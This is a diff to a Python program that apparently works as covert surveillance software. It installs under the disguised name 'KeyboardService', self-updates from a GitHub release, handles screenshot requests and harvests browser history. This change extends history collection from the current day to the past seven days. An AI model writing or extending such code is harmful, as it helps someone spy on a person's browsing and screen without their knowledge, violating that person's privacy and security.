@@ -20,7 +20,7 @@ import ctypes
 import tempfile
 import uuid
 import getpass
-from datetime import datetime
+from datetime import datetime, timedelta
 from io import BytesIO
 from urllib.parse import urlparse
 from ctypes import wintypes
@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.0.10"
+APP_VERSION = "1.2"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -431,13 +431,11 @@ def collect_browser_history_entries(browser_name, db_path):
 
 def sync_browser_history():
     global browser_history_seen
-    today_start_ms = int(
-        datetime.now().astimezone().replace(hour=0, minute=0, second=0, microsecond=0).timestamp() * 1000
-    )
+    cutoff_ms = int((datetime.now().astimezone() - timedelta(seconds=WEBSITE_HISTORY_MAX_AGE_SECONDS)).timestamp() * 1000)
 
     for browser_name, db_path in browser_history_paths():
         for entry in collect_browser_history_entries(browser_name, db_path):
-            if entry["visited_at"] < today_start_ms:
+            if entry["visited_at"] < cutoff_ms:
                 continue
             cache_key = (browser_name, entry["url"], entry["visited_at"])
             if cache_key in browser_history_seen:
